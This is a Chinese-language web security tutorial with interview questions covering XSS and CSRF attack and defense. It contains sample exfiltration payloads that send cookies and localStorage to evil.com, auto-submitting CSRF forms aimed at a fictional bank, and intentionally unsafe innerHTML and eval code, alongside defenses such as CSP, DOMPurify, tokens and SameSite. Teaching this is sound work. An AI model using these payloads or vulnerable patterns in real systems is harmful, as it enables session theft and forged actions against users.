---
sidebar_position: 2
title: "XSS 与 CSRF 攻防实战"
difficulty: "hard"
tags: ["XSS", "CSRF", "CSP", "安全防御"]
---

# XSS 与 CSRF 攻防实战

## XSS（跨站脚本攻击）详解

XSS（Cross-Site Scripting）是前端最常见、危害最大的安全漏洞之一。攻击者通过注入恶意脚本，在受害者浏览器中执行，从而窃取数据、劫持会话或进行钓鱼攻击。

### 三种 XSS 类型对比

| 特性 | 反射型 XSS | 存储型 XSS | DOM 型 XSS |
|------|-----------|-----------|------------|
| **攻击向量** | URL 参数 | 数据库/持久化存储 | 客户端 DOM 操作 |
| **触发方式** | 点击恶意链接 | 访问含恶意内容页面 | 客户端 JS 执行 |
| **危害程度** | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| **检测难度** | 低 | 中 | 高 |
| **持久性** | 一次性 | 持久化 | 一次性 |
| **服务器参与** | 需要 | 需要 | 不需要 |
| **典型场景** | 搜索结果页 | 评论区、留言板 | 前端路由、模板渲染 |

### 反射型 XSS 攻击示例

```javascript
// 恶意 URL: https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

// 服务器端不安全的实现
app.get('/search', (req, res) => {
  const query = req.query.q;
  // ❌ 直接将用户输入嵌入 HTML
  res.send(`<h1>搜索结果: ${query}</h1>`);
});
```

### 存储型 XSS 攻击示例

```javascript
// 攻击者在评论区提交恶意内容
const maliciousComment = `
  Great article!
  <img src="x" onerror="
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        url: location.href
      })
    })
  ">
`;

// ❌ 不安全的渲染方式
commentElement.innerHTML = maliciousComment;
```

### DOM 型 XSS 攻击示例

```javascript
// URL: https://example.com/page#<img src=x onerror=alert(document.cookie)>

// ❌ 不安全：直接使用 location.hash
const hash = decodeURIComponent(location.hash.slice(1));
document.getElementById('content').innerHTML = hash;

// ❌ 不安全：使用 document.write
document.write('<h1>' + new URLSearchParams(location.search).get('title') + '</h1>');

// ❌ 不安全：eval 用户输入
const userCode = new URLSearchParams(location.search).get('callback');
eval(userCode);
```

:::warning 危险源与危险汇
DOM XSS 的关键是识别 **Source（危险源）** 和 **Sink（危险汇）**：
- Source：`location.hash`、`location.search`、`document.referrer`、`postMessage`
- Sink：`innerHTML`、`document.write`、`eval`、`setTimeout(string)`、`location.href`
:::

---

## XSS 防御体系

### 1. 输入验证与输出编码

不同上下文需要不同的转义策略：

| 输出上下文 | 转义规则 | 示例 |
|-----------|----------|------|
| HTML 正文 | 转义 `<>&"'` | `&lt;script&gt;` |
| HTML 属性 | 转义引号+HTML实体 | `value="&quot;data&quot;"` |
| JavaScript | Unicode 转义 | `\u003cscript\u003e` |
| URL 参数 | encodeURIComponent | `%3Cscript%3E` |
| CSS 值 | CSS 转义 | `\3c script\3e` |

```javascript
// 通用 HTML 转义函数
function escapeHtml(str) {
  const escapeMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, char => escapeMap[char]);
}

// 针对不同上下文的编码
function encodeForJavaScript(str) {
  return str.replace(/[^\w. ]/gi, (c) => {
    return '\\u' + ('0000' + c.charCodeAt(0).toString(16)).slice(-4);
  });
}
```

### 2. DOMPurify 使用

```javascript
import DOMPurify from 'dompurify';

// 基础使用
const cleanHTML = DOMPurify.sanitize(dirtyHTML);

// 自定义配置 - 只允许特定标签和属性
const config = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href', 'title', 'target'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'],  // 自动添加属性
};
const safeHTML = DOMPurify.sanitize(userContent, config);

// Hook：修改清理行为
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  // 给所有链接添加 noopener
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

// React 中使用
function SafeContent({ html }) {
  return (
    <div
      dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(html, {
          ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
          ALLOWED_ATTR: ['href'],
        }),
      }}
    />
  );
}
```

### 3. CSP（Content Security Policy）完整配置

```html
<!-- Meta 标签方式 -->
<meta http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    script-src 'self' 'nonce-abc123';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self' https://api.example.com;
    font-src 'self' https://fonts.googleapis.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
  "
>
```

```javascript
// Express 中使用 helmet 配置 CSP
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    frameAncestors: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
  },
  reportOnly: false, // 设为 true 可先测试不阻断
}));

// 使用 nonce 允许内联脚本
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});
```

:::tip CSP 部署建议
1. 先使用 `Content-Security-Policy-Report-Only` 收集违规报告
2. 逐步收紧策略，避免破坏正常功能
3. 使用 `report-uri` 收集违规日志进行分析
4. 避免使用 `unsafe-inline` 和 `unsafe-eval`
:::

### 4. Trusted Types API

```javascript
// 注册策略
if (window.trustedTypes && trustedTypes.createPolicy) {
  const sanitizePolicy = trustedTypes.createPolicy('default', {
    createHTML: (input) => DOMPurify.sanitize(input),
    createScript: (input) => input, // 严格模式下应拒绝
    createScriptURL: (input) => {
      const url = new URL(input, location.origin);
      if (url.origin === location.origin) return input;
      throw new TypeError('不允许的脚本 URL');
    },
  });
}

// CSP 中启用 Trusted Types
// Content-Security-Policy: trusted-types default; require-trusted-types-for 'script'
```

---

## CSRF（跨站请求伪造）详解

### 攻击原理

CSRF 利用浏览器自动携带 Cookie 的特性，诱导用户在已登录状态下访问恶意页面，从而以用户身份执行非预期操作。

```
用户 → 登录 bank.com → 获得 session Cookie
  ↓
用户 → 访问 evil.com → evil.com 页面包含：
  ↓
<img src="https://bank.com/transfer?to=attacker&amount=10000">
  ↓
浏览器自动携带 bank.com 的 Cookie → 转账成功
```

### GET 型 CSRF 攻击

```html
<!-- 攻击者页面 evil.com -->
<!-- 方式1：利用 img 标签 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">

<!-- 方式2：利用 iframe -->
<iframe src="https://bank.com/delete-account" style="display:none"></iframe>

<!-- 方式3：利用链接诱导点击 -->
<a href="https://bank.com/transfer?to=attacker&amount=10000">
  点击领取优惠券
</a>
```

### POST 型 CSRF 攻击

```html
<!-- 自动提交的隐藏表单 -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

:::warning
CSRF 攻击的危险在于：用户可能完全不知情，仅仅访问了一个恶意网页就被执行了敏感操作。
:::

---

## CSRF 防御体系

### 1. CSRF Token（同步令牌模式）

```javascript
// 服务端生成 Token
const crypto = require('crypto');

function generateCSRFToken(session) {
  const token = crypto.randomBytes(32).toString('hex');
  session.csrfToken = token;
  return token;
}

// Express 中间件验证
function csrfProtection(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }

  const token = req.headers['x-csrf-token'] || req.body._csrf;
  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'CSRF token 验证失败' });
  }
  next();
}

// 前端发送请求时携带 Token
async function secureRequest(url, data) {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
  return fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    },
    body: JSON.stringify(data),
    credentials: 'same-origin',
  });
}
```

### 2. SameSite Cookie 属性

| 属性值 | 跨站读取 | 跨站写入 | 适用场景 |
|--------|----------|----------|----------|
| `Strict` | ❌ 完全禁止 | ❌ 禁止 | 银行、支付等高安全场景 |
| `Lax` | ❌ 禁止 | ✅ 顶级导航GET允许 | 大多数网站（默认值） |
| `None` | ✅ 允许 | ✅ 允许 | 需要跨站的第三方服务（需配合 Secure） |

```javascript
// 设置 SameSite Cookie
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'Lax', // 推荐默认值
  maxAge: 3600000,
  path: '/',
});
```

### 3. Origin / Referer 验证

```javascript
function validateOrigin(req, res, next) {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = ['https://example.com', 'https://www.example.com'];

  if (!origin) {
    // 某些请求可能没有 Origin（如书签直接访问）
    return next();
  }

  const requestOrigin = new URL(origin).origin;
  if (!allowedOrigins.includes(requestOrigin)) {
    return res.status(403).json({ error: '来源验证失败' });
  }
  next();
}
```

### 4. Double Submit Cookie

```javascript
// 服务端设置一个随机 Cookie（不是 session cookie）
res.cookie('csrf-double', crypto.randomBytes(32).toString('hex'), {
  secure: true,
  sameSite: 'Lax',
  // 注意：这里不设置 httpOnly，前端需要读取
});

// 前端读取 Cookie 并放入请求头
function getCSRFFromCookie() {
  const match = document.cookie.match(/csrf-double=([^;]+)/);
  return match ? match[1] : '';
}

fetch('/api/action', {
  method: 'POST',
  headers: { 'X-CSRF-Token': getCSRFFromCookie() },
  body: JSON.stringify(data),
});

// 服务端验证：Cookie 值 === Header 值
function doubleSubmitCheck(req, res, next) {
  const cookieToken = req.cookies['csrf-double'];
  const headerToken = req.headers['x-csrf-token'];
  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF 验证失败' });
  }
  next();
}
```

---

## 综合防御实战：Express 完整安全中间件

```javascript
const express = require('express');
const helmet = require('helmet');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');

const app = express();

// 1. 安全响应头
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
    },
  },
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: true,
  crossOriginResourcePolicy: { policy: "same-origin" },
}));

// 2. CSRF 保护
app.use((req, res, next) => {
  if (req.method === 'GET') {
    const token = crypto.randomBytes(32).toString('hex');
    req.session.csrfToken = token;
    res.locals.csrfToken = token;
  }
  next();
});

app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    const token = req.headers['x-csrf-token'] || req.body?._csrf;
    if (token !== req.session.csrfToken) {
      return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
});

// 3. 速率限制（防止暴力攻击）
app.use('/api/', rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: '请求过于频繁，请稍后再试' },
}));

// 4. 输入清理中间件
app.use(express.json({ limit: '10kb' })); // 限制请求体大小
app.use((req, res, next) => {
  // 递归清理所有字符串输入
  const sanitize = (obj) => {
    for (const key in obj) {
      if (typeof obj[key] === 'string') {
        obj[key] = obj[key].replace(/<[^>]*>/g, ''); // 基础 HTML 标签移除
      } else if (typeof obj[key] === 'object') {
        sanitize(obj[key]);
      }
    }
  };
  if (req.body) sanitize(req.body);
  next();
});
```

---

## 面试高频题

### Q1: XSS 和 CSRF 有什么区别？

| 对比项 | XSS | CSRF |
|--------|-----|------|
| 攻击目标 | 用户浏览器 | 服务器 |
| 利用方式 | 注入脚本执行 | 利用用户身份 |
| 是否需要登录 | 不一定 | 必须已登录 |
| 能否获取数据 | 可以 | 通常不能 |
| 核心防御 | 输入转义 + CSP | Token + SameSite |

### Q2: 如何防御存储型 XSS？

:::tip 参考答案
1. **输入侧**：服务端白名单过滤 + DOMPurify 清理
2. **输出侧**：根据上下文进行适当编码（HTML/JS/URL）
3. **传输侧**：设置 CSP 策略限制脚本执行
4. **存储侧**：数据库存储原始数据，渲染时转义
5. **监控侧**：CSP 违规上报 + 异常行为检测
:::

### Q3: CSP 中 nonce 和 hash 的区别是什么？

- **nonce**：每次请求生成随机值，标记在允许执行的 script 标签上。适合动态页面。
- **hash**：计算脚本内容的 hash 值加入 CSP。适合静态内联脚本。
- nonce 需要服务端配合生成，hash 可以预先计算但脚本内容不能变。

### Q4: SameSite=Lax 和 Strict 的区别？各有什么问题？

- **Strict**：完全禁止跨站携带 Cookie。问题：从外部链接跳转到网站时用户需要重新登录。
- **Lax**：允许顶级导航的 GET 请求携带 Cookie。问题：如果有 GET 请求的状态修改接口仍然有风险。

### Q5: 为什么 HttpOnly Cookie 不能完全防御 XSS？

HttpOnly 只能防止 JS 读取 Cookie，但 XSS 仍然可以：发起携带 Cookie 的请求（CSRF）、修改页面内容进行钓鱼、键盘记录、重定向用户、读取页面上的敏感数据。

### Q6: DOM 型 XSS 为什么难以检测？如何防御？

DOM XSS 完全在客户端执行，不经过服务器，传统 WAF 无法检测。防御方式：避免使用 innerHTML/document.write，使用 textContent 代替，启用 Trusted Types，CSP 禁止 eval。

### Q7: CSRF Token 为什么不能放在 Cookie 中？

如果 Token 放在 Cookie 中，攻击者虽然无法读取（同源策略），但浏览器会自动携带，无法区分是否为用户主动操作。Token 应放在表单隐藏字段或自定义请求头中。

### Q8: 如何设计一个安全的富文本编辑器？

1. 使用白名单机制只允许安全标签和属性
2. 使用 DOMPurify 在前端清理
3. 服务端二次过滤
4. 配置 CSP 禁止内联脚本
5. 渲染时使用沙箱 iframe 隔离
6. 定期更新清理规则库
